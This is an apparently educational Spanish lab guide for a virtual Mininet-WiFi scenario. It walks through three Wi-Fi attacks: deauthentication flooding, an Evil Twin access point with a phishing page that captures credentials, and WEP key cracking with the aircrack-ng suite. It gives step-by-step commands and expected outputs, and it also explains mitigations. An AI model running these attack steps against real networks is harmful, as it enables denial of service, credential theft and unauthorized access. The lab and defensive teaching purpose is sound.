# Escenario WiFi 802.11: Deauth Flood + Evil Twin + Ataque WEP

## Descripción General

Este escenario implementa una demostración completa de tres ataques clásicos sobre redes WiFi 802.11:

- **Ataque de Desautenticación (Deauth Flood)**: el atacante envía frames 802.11 `Deauthentication` falsificados para desconectar continuamente a un cliente legítimo de su AP.
- **Evil Twin / Rogue AP**: el atacante levanta un AP falso con el mismo SSID que el legítimo. Si se combina con el ataque deauth, la víctima se reconecta al AP falso y expone su tráfico. Se incluye un servidor de phishing que captura credenciales.
- **WEP Cracking (pipeline completo)**: captura pasiva de IVs con `airodump-ng` + autenticación falsa + inyección ARP con `aireplay-ng` para generar IVs masivamente + crack estadístico con `aircrack-ng`.

El entorno se ejecuta sobre **Mininet-WiFi** con el módulo `mac80211_hwsim` del kernel Linux, que crea interfaces 802.11 virtuales completamente funcionales (hostapd, wpa_supplicant, airodump-ng y aireplay-ng operan sobre ellas de forma nativa).

---

## Topología de Red

```
         ┌──────────────────────────────────────────────────────┐
         │              Red WiFi 802.11g — SSID: RedInsegura     │
         │                    Canal 6 / WEP-40                    │
         │                                                        │
         │  [sta1 víctima]          [ap1 AP legítimo]             │
         │   10.0.4.10       ╌╌╌╌╌╌╌╌▶ 10.0.4.1                 │
         │   wlan0                      BSSID: auto               │
         │                              WEP: AABBCCDDEE           │
         │  [sta2 cliente]    ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌▼                 │
         │   10.0.4.20                  [switch s1]               │
         │   wlan0                          │                     │
         │                                 │ (cable)             │
         │  [attacker]       ╌╌ mon0 ╌╌╌╌╌╌┘   [server]          │
         │   10.0.4.30                           10.0.4.100       │
         │   wlan0 → mon0  (monitor)             HTTP:80 FTP:21   │
         │   wlan1          (Evil Twin AP)                        │
         └──────────────────────────────────────────────────────┘
```

**Flujo de ataques:**
```
[Deauth]    attacker (mon0) ──[Deauth frames]──▶ sta1
                             (sta1 pierde asociación con ap1)

[Evil Twin] attacker (wlan1) levanta AP falso SSID=RedInsegura
            sta1 se reconecta al AP falso ──▶ attacker captura tráfico

[WEP]       airodump-ng (mon0) ──captura IVs──▶ /tmp/wep_capture-01.cap
            aireplay-ng ──ARP replay──▶ genera ~1000 IV/s
            aircrack-ng ──analiza IVs──▶ KEY FOUND! [ AA:BB:CC:DD:EE ]
```

---

## Hosts y Configuración

| Host | IP | MAC | Rol | Servicios |
|------|-----|-----|-----|-----------|
| ap1 | 10.0.4.1 | auto | AP legítimo (WEP-40) | hostapd, SSID: RedInsegura |
| sta1 | 10.0.4.10 | auto | Estación víctima | wpa_supplicant (WEP) |
| sta2 | 10.0.4.20 | auto | Cliente legítimo | wpa_supplicant (WEP) |
| attacker | 10.0.4.30 | auto | Atacante | wlan0→mon0 (monitor), wlan1 (Evil Twin) |
| server | 10.0.4.100 | auto | Servidor backend | HTTP:80, FTP:21 (simulado) |

**Clave WEP del AP legítimo:** `AABBCCDDEE` (hex, WEP-40 = 5 bytes)

---

## Archivos del Proyecto

| Archivo | Descripción |
|---------|-------------|
| `wifi_scenario.py` | Topología Mininet-WiFi: AP WEP, estaciones, atacante, servidor |
| `deauth_attack.py` | Deauth flood con Scapy: frames 802.11 Deauthentication falsificados |
| `evil_twin.py` | AP falso: hostapd + dnsmasq DHCP + servidor HTTP phishing |
| `wifi_attack.py` | Pipeline WEP: airodump-ng + aireplay-ng + aircrack-ng |
| `setup_wifi_scenario.sh` | Instala dependencias y carga mac80211_hwsim |
| `README_WIFI_ATTACKS.md` | Esta documentación |

---

## Requisitos Previos

### Dependencias del sistema

```bash
# Herramientas de auditoría WiFi
sudo apt-get install aircrack-ng hostapd dnsmasq

# Python y Scapy (para deauth y frames Dot11)
sudo apt-get install python3-scapy

# Herramientas de red WiFi
sudo apt-get install iw wireless-tools

# Monitor de tráfico
sudo apt-get install tcpdump
```

### Instalar Mininet-WiFi

Mininet-WiFi no está en los repositorios estándar. Instalar desde PyPI o desde fuente:

```bash
# Opción A: vía pip (si está disponible)
sudo pip3 install mininet-wifi

# Opción B: desde fuente (recomendado para versión completa)
git clone https://github.com/intrig-unicamp/mininet-wifi.git
cd mininet-wifi
sudo python3 setup.py install
```

O usando el script de setup incluido (automatiza todo lo anterior):

```bash
sudo ./setup_wifi_scenario.sh
```

### Módulo kernel mac80211_hwsim

```bash
# Cargar el módulo con 5 radios virtuales
sudo modprobe mac80211_hwsim radios=5

# Verificar que está cargado
lsmod | grep mac80211_hwsim

# Ver las interfaces WiFi virtuales creadas
iw dev
```

---

## Cómo Funciona el Escenario

### 1. Infraestructura WiFi virtual con mac80211_hwsim

El módulo `mac80211_hwsim` del kernel Linux crea interfaces de red 802.11 completamente virtuales. Cada "radio" creada expone una interfaz `wlanX` que puede configurarse como:
- **Managed**: cliente WiFi (usa wpa_supplicant)
- **AP**: punto de acceso (usa hostapd)
- **Monitor**: captura pasiva de todos los frames del canal

Mininet-WiFi gestiona estas interfaces y las asigna a los nodos (hosts), emulando propagación de señal con el modelo `logDistance`.

### 2. AP con cifrado WEP

El AP `ap1` corre `hostapd` con la clave WEP-40 `AABBCCDDEE`. Las estaciones `sta1` y `sta2` se asocian automáticamente usando `wpa_supplicant`. Todo el tráfico entre ellas y el servidor viaja cifrado con WEP (RC4 con IVs de 24 bits).

**Por qué WEP es vulnerable:**
- WEP usa RC4 con una clave de sesión = IV (24 bits, en claro en la cabecera) + clave maestra
- Con IVs distintos se puede recuperar la clave maestra mediante estadísticas sobre el keystream
- Con ~20.000 IVs (WEP-40) o ~200.000 IVs (WEP-104), aircrack-ng recupera la clave en segundos

### 3. Modo monitor del atacante

Al iniciar el escenario, se crea la interfaz `mon0` sobre `attacker-wlan0` en modo monitor. Esta interfaz captura **todos** los frames 802.11 del canal, incluyendo los de stations que no están asociadas con el atacante.

La segunda interfaz `attacker-wlan1` queda libre para ser usada por el Evil Twin (hostapd del atacante).

---

## Guía de Uso Paso a Paso

### PASO 1: Instalar dependencias

```bash
cd /home/mininet/entornos-tfm/wifi-attacks
sudo ./setup_wifi_scenario.sh
```

Verifica que al final aparezcan `[OK]` para aircrack-ng, hostapd y mininet-wifi.

### PASO 2: Iniciar la topología

```bash
sudo python3 wifi_scenario.py
```

Durante el arranque verás:

```
*** Limpiando configuración previa
*** Cargando módulo mac80211_hwsim (interfaces WiFi virtuales)
*** Creando topología Mininet-WiFi
  [OK] Mininet-WiFi con modelo de interferencia wmediumd
*** Creando nodos
*** Configurando nodos WiFi
*** Construyendo e iniciando red
*** Configurando escenario
  [OK] HTTP activo en 10.0.4.100:80
  [OK] Interfaz monitor mon0 activa
  Generando tráfico de fondo (para captura de IVs WEP)...
  [OK] /tmp/deauth_attack.py
  [OK] /tmp/evil_twin.py
  [OK] /tmp/wifi_attack.py

========================================================================
  ESCENARIO WIFI 802.11 — LISTO
========================================================================
  Red:      SSID=RedInsegura         Canal=6 (802.11g)
  Cifrado:  WEP-40
  Clave:    AABBCCDDEE (hex)
------------------------------------------------------------------------
  Host         IP               MAC
  ap1 (AP)     10.0.4.1         AA:BB:CC:DD:EE:FF
  sta1         10.0.4.10        00:00:00:04:00:10
  sta2         10.0.4.20        00:00:00:04:00:20
  attacker     10.0.4.30        00:00:00:04:00:30  (mon0 activa / wlan1 libre)
  server       10.0.4.100       HTTP:80 FTP:21
========================================================================
  ATAQUES DISPONIBLES
------------------------------------------------------------------------
  [1] Deauth flood
      mininet> attacker python3 /tmp/deauth_attack.py --bssid AA:BB:CC:DD:EE:FF --client 00:00:00:04:00:10

  [2] Evil Twin
      mininet> attacker python3 /tmp/evil_twin.py --ssid RedInsegura --iface attacker-wlan1 --phishing

  [3] WEP Cracking
      mininet> attacker python3 /tmp/wifi_attack.py --bssid AA:BB:CC:DD:EE:FF --channel 6 --client 00:00:00:04:00:10
========================================================================
```

### PASO 3: Verificar conectividad WiFi

```
# Comprobar que sta1 está asociada al AP legítimo
mininet> sta1 iw dev sta1-wlan0 link

# Salida esperada:
Connected to AA:BB:CC:DD:EE:FF (on sta1-wlan0)
        SSID: RedInsegura
        freq: 2437
        RX: ...
        TX: ...

# Ping a través del AP
mininet> sta1 ping -c3 10.0.4.100

# Verificar HTTP
mininet> sta1 curl http://10.0.4.100
```

### PASO 4: Obtener las MACs del AP y las estaciones

Para los ataques necesitas las MACs reales asignadas por mac80211_hwsim:

```
# Ver todas las interfaces WiFi del escenario
mininet> sh iw dev

# Ver MAC de una interfaz específica
mininet> sta1 cat /sys/class/net/sta1-wlan0/address
mininet> sh cat /sys/class/net/ap1-wlan0/address

# Alternativa: ver asociaciones actuales en el AP
mininet> ap1 iw dev ap1-wlan0 station dump
```

---

## PASO 5: Ataque de Desautenticación (Deauth Flood)

El ataque de desautenticación explota que los frames de management 802.11 **no están autenticados** en WEP/WPA/WPA2 (solo WPA3 con PMF lo soluciona). Cualquier estación en el canal puede falsificar un frame `Deauthentication` como si viniera del AP.

> **Nota sobre mac80211_hwsim:** En este entorno virtual, la inyección de
> frames 802.11 via Scapy/raw sockets no se entrega a otras interfaces
> virtuales (limitación del driver hwsim en kernel 5.4). El script incluye
> el flag `--hwsim` que usa `hostapd_cli` internamente para enviar el
> deauth a través del stack real del AP, lo que sí produce el efecto.

### 5.1 Abrir terminal de monitorización en sta1

Antes de lanzar el ataque abre un xterm para sta1 y lanza un ping continuo
al servidor. El ping es el indicador más directo de la desconexión:

```
mininet> xterm sta1
```

En el xterm de sta1:

```bash
ping -i 0.5 10.0.4.100
```

Deja el xterm visible. Cuando el ataque desconecte a sta1, los pings
mostrarán `Destination Host Unreachable`.

### 5.2 Lanzar el ataque deauth (modo hwsim)

Usa las MACs reales que muestra el banner del escenario al arrancar.

```
# Desconectar sta1 (50 rondas, ~5 segundos de ataque)
mininet> attacker python3 /tmp/deauth_attack.py \
           --bssid <MAC_AP> --client <MAC_STA1> --count 50 --hwsim

# Desconectar continuamente (hasta Ctrl+C)
mininet> attacker python3 /tmp/deauth_attack.py \
           --bssid <MAC_AP> --client <MAC_STA1> --hwsim

# Desconectar TODOS los clientes del AP
mininet> attacker python3 /tmp/deauth_attack.py \
           --bssid <MAC_AP> --client FF:FF:FF:FF:FF:FF --hwsim
```

**Salida del ataque:**

```
=================================================================
  ATAQUE DE DESAUTENTICACION 802.11 (DEAUTH FLOOD)
=================================================================
Interfaz:   mon0 (modo monitor)
AP (BSSID): 02:00:00:00:04:00
Cliente:    02:00:00:00:00:00
Razon:      7 - Class 3 frame from nonassociated STA
Paquetes:   50
-----------------------------------------------------------------

[*] Modo hwsim: hostapd_cli (Scapy injection no efectivo en mac80211_hwsim)
[*] Socket AP:  /var/run/hostapd
[*] Observar:   xterm sta1 -> ping -i 0.5 10.0.4.100
-----------------------------------------------------------------
[14:35:00] Estado inicial: CONECTADO al AP

[14:35:00] [>>] Enviando 50 rondas...
[14:35:05] [>>] Rondas: 50    Cliente: DESCONECTADO [OK]   9.8/s

[14:35:05] Estado final:   DESCONECTADO
```

**Efecto visible en el xterm de sta1:**

```
64 bytes from 10.0.4.100: icmp_seq=12 ttl=64 time=2.1 ms
64 bytes from 10.0.4.100: icmp_seq=13 ttl=64 time=1.9 ms
From 10.0.4.10 icmp_seq=14 Destination Host Unreachable
From 10.0.4.10 icmp_seq=15 Destination Host Unreachable
From 10.0.4.10 icmp_seq=16 Destination Host Unreachable
```

### 5.3 Reconectar sta1 tras el ataque

En este entorno `wpa_supplicant` no actúa como proceso independiente en las
estaciones, por lo que la reconexión no es automática. El script muestra el
comando al finalizar. Para reconectar manualmente:

```
mininet> sta1 iw dev sta1-wlan0 connect RedInsegura 2437 <MAC_AP> key 0:d:AABBCCDDEE
```

Verificar reconexión:

```
mininet> sta1 iw dev sta1-wlan0 link
mininet> sta1 ping -c3 10.0.4.100
```

Los pings del xterm deben reanudarse.

---

## PASO 6: Evil Twin (AP Falso + Phishing)

El Evil Twin levanta un AP abierto (sin cifrado) con el mismo SSID que el legítimo.
En Mininet-WiFi con mac80211_hwsim, la víctima **no se reconecta automáticamente**
tras el deauth; hay que forzar la asociación con `iw dev connect`.

### 6.1 Obtener la MAC del atacante (BSSID del Evil Twin)

```
mininet> attacker ip link show attacker-wlan1
# Apuntar la MAC, p. ej.: 02:00:00:0b:00:01
```

### 6.2 Levantar el Evil Twin con phishing

```
mininet> attacker python3 /tmp/evil_twin.py \
           --ssid RedInsegura --iface attacker-wlan1 --phishing
```

**Salida esperada (texto ASCII):**

```
=================================================================
  EVIL TWIN / ROGUE AP - AP FALSO PHISHING
=================================================================
SSID:       RedInsegura  (identico al AP legitimo)
Interfaz:   attacker-wlan1
Canal:      6
IP AP:      10.0.4.200/24
DHCP:       10.0.4.210 - 10.0.4.220
Phishing:   SI - HTTP :80 (pagina de login falsa)
-----------------------------------------------------------------
[14:36:00] [*] Lanzando hostapd (AP falso SSID: RedInsegura)...
[14:36:02] [OK]  hostapd en ejecucion (PID: 1234)
[14:36:02] [OK]  dnsmasq en ejecucion (PID: 1235)
[14:36:02] [OK] Servidor phishing HTTP:80 activo
=================================================================
[14:36:02] [OK] Evil Twin ACTIVO - esperando victimas...
```

### 6.3 Desconectar sta1 del AP legítimo y conectarla al Evil Twin

```
# 1. Desautenticar sta1 del AP real (3 rondas son suficientes)
mininet> attacker python3 /tmp/deauth_attack.py \
           --bssid <MAC_AP1> --client <MAC_STA1> --hwsim --count 3

# 2. Conectar sta1 al AP falso indicando su BSSID (sin clave = red abierta)
mininet> sta1 iw dev sta1-wlan0 connect RedInsegura 2437 <MAC_ATTACKER_WLAN1>
```

> **Nota:** sta1 conserva su IP estática 10.0.4.10/24 al reconectarse —
> no necesita DHCP para alcanzar 10.0.4.200/24 (misma subred).

Confirmación de conexión en la consola del Evil Twin:

```
[14:36:15] [>>] CLIENTE CONECTADO AL AP FALSO: 00:00:00:04:00:10
                 Total clientes: 1
```

### 6.4 Verificar que sta1 accede al servidor phishing

```
# Ping al gateway del Evil Twin
mininet> sta1 ping -c3 10.0.4.200

# Petición HTTP a la página de phishing
mininet> sta1 curl http://10.0.4.200
```

En la consola del Evil Twin aparece:

```
[14:36:18] [HTTP] 10.0.4.10 - "GET / HTTP/1.1" 200 -
```

Si sta1 envía credenciales (simulando un POST):

```
mininet> sta1 curl -X POST http://10.0.4.200/login \
           -d "usuario=juan.garcia&contrasena=MiClave123&pin=482916"
```

```
[14:36:30] [!!] CREDENCIALES CAPTURADAS desde 10.0.4.10:
                 usuario      = juan.garcia
                 contrasena   = MiClave123
                 pin          = 482916
```

---

## PASO 7: Ataque WEP Completo

> **Limitacion en mac80211_hwsim:** Los frames inyectados via interfaz
> monitor no llegan al resto de radios virtuales (kernel 5.4). Por eso:
>
> - **Fase 1 (airodump-ng)**: funciona — captura los frames WEP del
>   trafico existente en mon0.
> - **Fase 2 (fake auth)**: no recibe confirmacion del AP; el script
>   continua igualmente sin bloquearse.
> - **Fase 3 (ARP replay)**: aireplay-ng arranca pero sus frames
>   inyectados no generan IVs nuevos. Los IVs vienen solo del trafico
>   de sta1/sta2.
> - **Fase 4 (aircrack-ng)**: funciona si hay suficientes IVs en la
>   captura.

### 7.1 Acelerar la acumulacion de IVs con pings rapidos

El trafico de fondo (~15 frames WEP/s) es demasiado lento. Anadir
pings rapidos desde ambas estaciones antes de lanzar el ataque:

```
mininet> sta1 ping -i 0.05 10.0.4.100 &
mininet> sta2 ping -i 0.05 10.0.4.100 &
```

Con esto el trafico WEP sube a ~100 frames/s → ~6000 IVs/minuto:

| Tiempo | IVs aproximados |
|--------|----------------|
| 1 min  | ~6 000         |
| 3 min  | ~18 000        |
| 7 min  | ~42 000        |

### 7.2 Lanzar el pipeline con objetivo de IVs reducido

```
mininet> attacker python3 /tmp/wifi_attack.py \
           --bssid <MAC_AP> --channel 6 --client <MAC_STA1> \
           --min-ivs 10000
```

**Salida real esperada en cada fase:**

**Fase 1** — captura activa (funciona):
```
[14:37:00] [OK] airodump-ng iniciado (PID: 2001)
[14:37:00] [*]  Captura en: /tmp/wep_capture-01.cap
```

**Fase 2** — fake auth (no hay confirmacion en hwsim, continua):
```
[14:37:03] [INFO] Fake Auth completada (resultado: puede variar en entorno virtual)
[14:37:03]        Salida: ...
```

**Fase 3** — ARP replay arranca, IVs suben solo por trafico natural:
```
[14:37:05] [OK] ARP Replay iniciado (PID: 2002)
[14:37:05] [*]  Inyectando a ~1000 paquetes/s para generar IVs rapidamente
[14:37:10] [Fase 3] IVs:   1800   / 10000  [###.................]  18%
[14:37:15] [Fase 3] IVs:   3600   / 10000  [#######.............]  36%
[14:37:20] [Fase 3] IVs:   5400   / 10000  [###########.........]  54%
[14:37:25] [Fase 3] IVs:   7200   / 10000  [##############......]  72%
[14:37:30] [Fase 3] IVs:   9600   / 10000  [###################.]  96%
[14:37:32] [OK] 10000 IVs alcanzados - suficiente para crack
```

**Fase 4** — aircrack-ng (funciona):
```
[14:37:33] +-- FASE 4: Cracking WEP con aircrack-ng ---------------+
[14:37:33] |  Analizando IVs en /tmp/wep_capture-01.cap
[14:37:33] +----------------------------------------------------------+

[14:37:34] +----------------------------------------------------------+
[14:37:34] |  CLAVE WEP ENCONTRADA!
[14:37:34] |  Clave (hex): AA:BB:CC:DD:EE
[14:37:34] +----------------------------------------------------------+
```

> **Si aircrack-ng no encuentra la clave con 10 000 IVs:** es normal.
> El algoritmo PTW necesita ~40 000 IVs para WEP-40 con alta
> probabilidad. Dejar correr la captura mas tiempo y reintentar:
>
> ```
> mininet> attacker aircrack-ng -b <MAC_AP> /tmp/wep_capture-01.cap
> ```

### 7.3 Solo captura + crack en dos pasos

Si se prefiere controlar cada fase por separado:

```
# Paso 1: iniciar captura en segundo plano
mininet> attacker python3 /tmp/wifi_attack.py \
           --bssid <MAC_AP> --channel 6 --phase 1

# (dejar corriendo; los pings rapidos generan IVs)
# Ctrl+C cuando se considere suficiente

# Paso 2: crack sobre la captura acumulada
mininet> attacker aircrack-ng -b <MAC_AP> /tmp/wep_capture-01.cap
```

---

## PASO 8: Limpiar y salir

```
mininet> exit
```

El escenario detiene automáticamente hostapd, airodump-ng y aireplay-ng al salir.

Para limpiar el entorno manualmente:

```bash
sudo mn -c
sudo pkill -9 hostapd
sudo pkill -9 airodump-ng
sudo pkill -9 aireplay-ng
sudo pkill -9 dnsmasq
sudo rmmod mac80211_hwsim
```

---

## Cómo Funciona Cada Ataque

### Deauthentication Flood

Los frames de gestión 802.11 (Management Frames) como `Deauthentication` y `Disassociation` **no están autenticados** ni protegidos en WEP/WPA/WPA2 (a menos que se active **PMF** — Protected Management Frames, obligatorio en WPA3).

El atacante puede falsificar cualquier dirección origen (addr2) sin que la víctima pueda distinguirlo del AP real:

```
Atacante (mon0)           Víctima (sta1)
     |                          |
     |──[Deauth addr2=AP_MAC]──▶|   (sta1 cree que el AP la ha echado)
     |                          |
     |◀──[Deauth addr2=STA_MAC]─|   (AP cree que sta1 se ha ido)
     |   (atacante envía esto)   |
```

El envío en **ambas direcciones** es clave: evita que el AP acepte una reasociación inmediata.

### Evil Twin

El Evil Twin explota que los clientes WiFi seleccionan el AP por SSID y señal (RSSI), no por autenticidad del AP. Si hay dos AP con el mismo SSID, el cliente puede conectarse al que tenga mejor señal:

1. Atacante crea AP falso (mismo SSID, sin cifrado o con cifrado diferente)
2. Ataque deauth desconecta a la víctima del AP real
3. El dispositivo de la víctima escanea APs disponibles y puede elegir el AP falso (mejor RSSI virtual)
4. Todo el tráfico de la víctima pasa por el atacante (MITM)
5. Si hay servidor de phishing, la víctima ve una página falsa al intentar navegar

**Por qué funciona:**
- Los estándares WEP/WPA no autentican la identidad del AP
- Los clientes confían en el SSID como identificador de red
- El usuario no distingue visualmente un AP falso de uno legítimo

### Ataque WEP — RC4 y la vulnerabilidad de los IVs

**Cifrado WEP:**
```
Trama WEP = Cabecera | IV(24 bits) | RC4(IV + Clave WEP) XOR Datos | ICV
```

El IV (Initialization Vector) se transmite **en claro** en la cabecera de cada trama. Hay sólo `2^24 = 16.777.216` IVs posibles. En una red con tráfico moderado, los IVs se repiten en horas.

**Por qué es rompible:**
- Fluye RC4 presenta correlaciones estadísticas conocidas (ataques FMS/PTW)
- Conociendo suficientes pares (IV, primer byte del keystream), se puede recuperar la clave
- El ataque PTW (implementado en aircrack-ng) necesita ~40.000 IVs para WEP-104 y ~20.000 para WEP-40

**Fase ARP Replay:**
El atacante captura un único paquete ARP cifrado con WEP (que el AP reenvía como broadcast). Como el atacante conoce el valor esperado del ARP descifrado (es un formato fijo), puede reinyectar ese mismo paquete cifrado una y otra vez. El AP lo acepta (el ICV está correcto) y **responde con un nuevo paquete usando un IV diferente**. Esto permite generar miles de IVs únicos en segundos sin conocer la clave.

---

## Conceptos de Seguridad Demostrados

| Concepto | Descripción |
|----------|-------------|
| **Management Frame injection** | Los frames 802.11 de gestión no están autenticados en WEP/WPA/WPA2 |
| **DoS WiFi** | Deauth flood es un ataque de denegación de servicio a nivel de enlace |
| **SSID spoofing** | El Evil Twin demuestra que el SSID no es un identificador de autenticidad |
| **MITM WiFi** | El Evil Twin posiciona al atacante entre la víctima e Internet |
| **Phishing con MITM** | Se combina reconexión forzada con página de login falsa |
| **WEP RC4 weakness** | Vulnerabilidad en la reutilización del espacio de IVs de 24 bits |
| **IV statistical attack** | El ataque PTW/FMS explota correlaciones en el keystream de RC4 |
| **ARP replay amplification** | Un único paquete ARP capturado genera miles de IVs nuevos |

---

## Mitigaciones en Redes Reales

### Contra Deauth Flood

- **PMF (Protected Management Frames)** — IEEE 802.11w, obligatorio en WPA3: autentica los frames de gestión con un código MIC, haciendo imposible la falsificación
- **WPA3** — incluye PMF de forma obligatoria
- **Detección**: WIDS (Wireless Intrusion Detection System) detecta ráfagas de frames deauth desde MACs no registradas

### Contra Evil Twin

- **WPA3-Enterprise (802.1X)**: el cliente verifica el certificado del servidor RADIUS; un AP falso no puede presentar un certificado válido
- **HSTS y HTTPS**: aunque el usuario esté en la red del atacante, no puede suplantar certificados TLS válidos (sin instalar una CA falsa)
- **802.11r + 802.11k**: roaming seguro que valida el AP destino antes de la reconexión
- **Network Access Control**: no confiar en la red WiFi; túnel VPN obligatorio

### Contra WEP

- **No usar WEP** — está formalmente deprecado desde 2004 (IEEE) y 2008 (Wi-Fi Alliance)
- Migrar a **WPA2-AES (CCMP)** o idealmente **WPA3**
- En entornos heredados que no pueden migrar: túnel VPN sobre WEP

---

## Troubleshooting

### mininet-wifi no importa

```bash
python3 -c "from mn_wifi.net import Mininet_wifi" 2>&1
```

Si falla, instalar manualmente:

```bash
sudo pip3 install mininet-wifi
# O desde fuente: git clone https://github.com/intrig-unicamp/mininet-wifi && cd mininet-wifi && sudo python3 setup.py install
```

### mac80211_hwsim no carga

```bash
# Verificar que el kernel tiene el módulo
modinfo mac80211_hwsim

# Si falla, necesitas kernel con CONFIG_MAC80211_HWSIM
# En Ubuntu 20.04+ está incluido por defecto:
sudo modprobe mac80211_hwsim radios=5
```

### Las estaciones no se asocian al AP o no reconectan tras un deauth

1. Verificar que hostapd está corriendo en ap1:
   ```
   mininet> ap1 ps aux | grep hostapd
   ```
2. Ver asociaciones actuales:
   ```
   mininet> ap1 iw dev ap1-wlan1 station dump
   ```
3. Reconectar una estación manualmente (`wpa_cli` no está disponible en este entorno):
   ```
   mininet> sta1 iw dev sta1-wlan0 connect RedInsegura 2437 <MAC_AP> key 0:d:AABBCCDDEE
   ```

### airodump-ng no ve paquetes del AP

- Verificar que mon0 está en el canal correcto:
  ```
  mininet> attacker iw dev mon0 set channel 6
  mininet> attacker iw dev mon0 info
  ```
- Verificar modo monitor:
  ```
  mininet> attacker iw dev | grep type
  # Debe mostrar: type monitor
  ```
- Si mon0 no existe, recrearla:
  ```
  mininet> attacker iw dev attacker-wlan0 interface add mon0 type monitor
  mininet> attacker ip link set mon0 up
  ```

### aireplay-ng falla con "No such BSSID available"

En entornos virtuales con mac80211_hwsim, aireplay-ng a veces no detecta el AP hasta que airodump-ng lleva unos segundos capturando. Esperar 10-15 segundos en la Fase 1 antes de lanzar las fases 2 y 3.

### aircrack-ng no encuentra la clave con 20.000 IVs

- WEP-40 necesita ~20.000–50.000 IVs según la distribución
- Aumentar el umbral: `--min-ivs 50000`
- En entornos virtuales, los IVs pueden estar menos distribuidos; aumentar a `--min-ivs 100000`
- Verificar que los paquetes capturados son WEP:
  ```bash
  python3 -c "
  from scapy.all import rdpcap
  from scapy.layers.dot11 import Dot11WEP
  pkts = rdpcap('/tmp/wep_capture-01.cap')
  print('Paquetes WEP:', sum(1 for p in pkts if p.haslayer(Dot11WEP)))
  "
  ```

### hostapd del Evil Twin falla al iniciar

```bash
# Ver log completo
cat /tmp/evil_twin_hostapd.log

# Verificar que la interfaz existe y está UP
mininet> attacker iw dev
mininet> attacker ip link show attacker-wlan1

# Si nl80211 falla, verificar que wpa_supplicant no usa attacker-wlan1
mininet> attacker pkill -9 wpa_supplicant; true
```

---

## Comparación de Protocolos de Seguridad WiFi

| Protocolo | Cifrado | Integridad | Auth frames | Resistencia WEP attack | En uso |
|-----------|---------|------------|-------------|------------------------|--------|
| WEP | RC4 (débil) | CRC-32 | No | Vulnerable en minutos | Deprecated |
| WPA-TKIP | RC4 + TKIP | Michael MIC | No | Seguro (TKIP) | Deprecated |
| WPA2-CCMP | AES-CCMP | CBC-MAC | No | Seguro | Vigente |
| WPA2+PMF | AES-CCMP | CBC-MAC | Sí (802.11w) | Seguro | Recomendado |
| WPA3-SAE | AES-GCMP | GMAC | Obligatorio | Seguro | Recomendado |

---

## Advertencia Legal

> **ADVERTENCIA:** Este escenario es únicamente para fines educativos en entornos controlados y aislados.
> Lanzar ataques de desautenticación, crear APs falsos o crackear redes WiFi ajenas **es ilegal** en la mayoría de jurisdicciones (España: art. 197 y 264 del Código Penal) y puede acarrear responsabilidades penales y civiles.
> Usar **exclusivamente** sobre infraestructura propia o con autorización escrita del propietario.

---

**Versión:** 1.0
**Fecha:** 2026-05-19
